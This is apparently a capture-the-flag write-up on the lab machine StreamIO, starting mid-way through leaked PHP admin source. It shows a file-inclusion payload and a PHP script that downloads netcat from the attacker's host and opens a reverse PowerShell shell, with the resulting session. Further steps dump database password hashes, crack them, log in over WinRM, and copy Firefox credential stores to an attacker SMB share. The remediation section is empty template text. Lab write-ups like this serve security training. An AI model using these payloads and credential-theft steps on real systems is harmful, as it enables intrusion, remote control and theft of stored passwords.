$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include'])); <--RCE
else
echo(" ---- ERROR ---- ");
}
?>
```

```
curl -sk 'https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php' \
  -b 'PHPSESSID=k3fh7aj356m5b9ids63elr0u91'
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <title>Admin panel</title>
        <link rel = "icon" href="/images/icon.png" type = "image/x-icon">
        <!-- Basic -->
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <!-- Mobile Metas -->
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <!-- Site Metas -->
        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        <!-- Custom styles for this template -->
        <link href="/css/style.css" rel="stylesheet" />
        <!-- responsive style -->
        <link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
        <center class="container">
                <br>
                <h1>Admin panel</h1>
                <br><hr><br>
                <ul class="nav nav-pills nav-fill">
                        <li class="nav-item">
                                <a class="nav-link" href="?user=">User management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?staff=">Staff management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?movie=">Movie management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?message=">Leave a message for admin</a>
                        </li>
                </ul>
                <br><hr><br>
                <div id="inc">
                        this option is for developers onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==          </div>
        </center>
</body>
</html>                                                    
```

index.php:

```
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <title>Admin panel</title>
        <link rel = "icon" href="/images/icon.png" type = "image/x-icon">
        <!-- Basic -->
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <!-- Mobile Metas -->
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <!-- Site Metas -->
        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        <!-- Custom styles for this template -->
        <link href="/css/style.css" rel="stylesheet" />
        <!-- responsive style -->
        <link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
        <center class="container">
                <br>
                <h1>Admin panel</h1>
                <br><hr><br>
                <ul class="nav nav-pills nav-fill">
                        <li class="nav-item">
                                <a class="nav-link" href="?user=">User management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?staff=">Staff management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?movie=">Movie management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?message=">Leave a message for admin</a>
                        </li>
                </ul>
                <br><hr><br>
                <div id="inc">
                        <?php
                                if(isset($_GET['debug']))
                                {
                                        echo 'this option is for developers only';
                                        if($_GET['debug'] === "index.php") {
                                                die(' ---- ERROR ----');
                                        } else {
                                                include $_GET['debug'];
                                        }
                                }
                                else if(isset($_GET['user']))
                                        require 'user_inc.php';
                                else if(isset($_GET['staff']))
                                        require 'staff_inc.php';
                                else if(isset($_GET['movie']))
                                        require 'movie_inc.php';
                                else 
                        ?>
                </div>
        </center>
</body>
</html>                            
```
---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

rce.php:

```php
system("powershell -c wget 10.10.15.80:9002/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.15.80 4444");
```

```
 curl -sk -X POST 'https://streamio.htb/admin/?debug=master.php' \
  -b 'PHPSESSID=k3fh7aj356m5b9ids63elr0u91' \
  --data-urlencode 'include=http://10.10.15.80:9002/rce.php'

```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.80] from (UNKNOWN) [10.129.154.2] 54821
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin> 

```


## Database enumeration

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.80] from (UNKNOWN) [10.129.154.2] 51487
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name
FROM master..sysdatabases;'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name
>> 
FROM master..sysdatabases;'
>> 

                                                                                                                                
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          

(1 rows affected)
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM
streamio_backup..sysobjects WHERE xtype = "U"'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM
>> 
streamio_backup..sysobjects WHERE xtype = "U"'
>> 

name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select
username,password from users;'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select
>> 
username,password from users;'
>> 

Changed database context to 'streamio_backup'.
username                                           password                                          
-------------------------------------------------- --------------------------------------------------
nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
James                                              c660060492d9edcaa8332d89c99c9239                  
Theodore                                           925e5408ecb67aea449373d668b7359e                  
Samantha                                           083ffae904143c4796e464dac33c1f7d                  
Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
William                                            d62be0dc82071bccc1322d64ec5b6c51                  
Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
PS C:\inetpub\streamio.htb\admin> 

```

```
PS C:\inetpub\streamio.htb\admin> dir c:\users
dir c:\users


    Directory: C:\users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/22/2022   2:48 AM                .NET v4.5                                                             
d-----        2/22/2022   2:48 AM                .NET v4.5 Classic                                                     
d-----        2/26/2022  10:20 AM                Administrator                                                         
d-----         5/9/2022   5:38 PM                Martin                                                                
d-----        2/26/2022   9:48 AM                nikk37                                                                
d-r---        2/22/2022   1:33 AM                Public                                                                


PS C:\inetpub\streamio.htb\admin> 

```

cracking hash:

```
hashcat -m 0 389d14cb8e4e9b94b137deb1caf0612a /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (1711 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 389d14cb8e4e9b94b137deb1caf0612a
Time.Started.....: Fri Oct  2 08:58:23 2026 (3 secs)
Time.Estimated...: Fri Oct  2 08:58:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2795.4 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7905280/14344385 (55.11%)
Rejected.........: 0/7905280 (0.00%)
Restore.Point....: 7903232/14344385 (55.10%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: getalife10 -> gerryberry
Hardware.Mon.#01.: Util: 68%

Started: Fri Oct  2 08:58:21 2026
Stopped: Fri Oct  2 08:58:27 2026
                                         
```

nikk37:get_dem_girls2@yahoo.com

```
nxc winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' 
WINRM       10.129.154.2    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.154.2    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
                                                                                                               
```
---
## User Flag

```
evil-winrm -i streamio.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ..
*Evil-WinRM* PS C:\Users\nikk37> cd Desktop
*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat user.txt
bcf0435640f5c7101ad9c7fd518cb996
*Evil-WinRM* PS C:\Users\nikk37\Desktop> 

```

---
## Lateral movement from nikk37 to jdgodd

### Enumeration

```
sudo bloodhound-python -u 'nikk37' -p 'get_dem_girls2@yahoo.com' -ns 10.129.154.2 -d streamio.htb -c all --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.streamio.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Testing resolved hostname connectivity dead:beef::1aa
INFO: Trying LDAP connection to dead:beef::1aa
INFO: Testing resolved hostname connectivity dead:beef::1e8:822e:a8c4:4cf7
INFO: Trying LDAP connection to dead:beef::1e8:822e:a8c4:4cf7
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Testing resolved hostname connectivity dead:beef::1aa
INFO: Trying LDAP connection to dead:beef::1aa
INFO: Testing resolved hostname connectivity dead:beef::1e8:822e:a8c4:4cf7
INFO: Trying LDAP connection to dead:beef::1e8:822e:a8c4:4cf7
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20261002121937_bloodhound.zip

```

enumerating users reveals jdgodd which through a chain of ACL can get admin
### File System enumeration

```shell
*Evil-WinRM* PS C:\Users\nikk37\Appdata> dir c:\'Program Files (x86)'


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM                PHP
d-----        2/22/2022   2:56 AM                Reference Assemblies
d-----        3/28/2022   4:46 PM                Windows Defender
d-----        3/28/2022   4:46 PM                Windows Mail
d-----        3/28/2022   4:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        3/28/2022   4:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell


```

```
impacket-smbserver -ip 10.10.15.80  -smb2support share /home/kali/machines/streamio
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0


```

```
*Evil-WinRM* PS C:\Users\nikk37\Appdata\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.15.80\share\
*Evil-WinRM* PS C:\Users\nikk37\Appdata\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.15.80\share\
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)

